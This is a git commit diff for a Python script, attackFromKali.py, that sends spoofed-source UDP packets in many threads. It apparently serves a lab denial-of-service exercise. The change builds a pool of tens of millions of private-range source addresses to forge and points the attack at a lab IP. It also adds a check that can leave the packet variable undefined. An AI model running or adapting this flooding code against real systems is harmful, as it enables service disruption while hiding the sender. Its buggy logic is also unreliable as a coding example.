a1fed778f3a8f35e65a38044cf5f74f737ce83dd
Hussein Mallah <mallahhuos3009@gmail.com>
2023-09-30 15:19:40 +0300

    Update attackFromKali.py
    .Increase source_ips to randomize more
    .Add condition to make sure the source ip is not the same as the server ip.

--- attackFromKali.py
+++ attackFromKali.py
@@ -4,13 +4,26 @@ import random
 import threading
 import time
 
+source_ips=[]
+for w in range(255):
+    for k in range(255):
+        for l in range(255):
+            ip_address = f"192.168.{k}.{l}"
+            ip_address1 = f"10.{w}.{k}.{l}"
+            if (w>=16) & (w<=31):
+                ip_address2 = f"172.{w}.{k}.{l}"
+                source_ips.append(ip_address2)
+            source_ips.append(ip_address)
+            source_ips.append(ip_address1)
+
 # Function representing the task to be performed in each thread
 def send_udp_packet(server_ip, server_port, source_ips, message):
     # Choose a random source IP address
     source_ip = random.choice(source_ips)
 
-    # Create a UDP packet with a randomized source IP
-    udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message
+    # Create a UDP packet with a randomized source IP, and without coinciding with server_ip
+    if (source_ip != server_ip): 
+        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message
 
     # Send the packet
     send(udp_packet)
@@ -21,11 +34,9 @@ def main():
     iterations = int(input("Enter the number of times to execute the attack: "))
     
     # Server IP and port (replace with actual values)
-    server_ip = '127.0.0.1'
+    server_ip = '192.168.180.128'
     server_port = 12345
 
-    # List of source IP addresses to use (replace with actual IPs)
-    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']
 
     threads = []
 
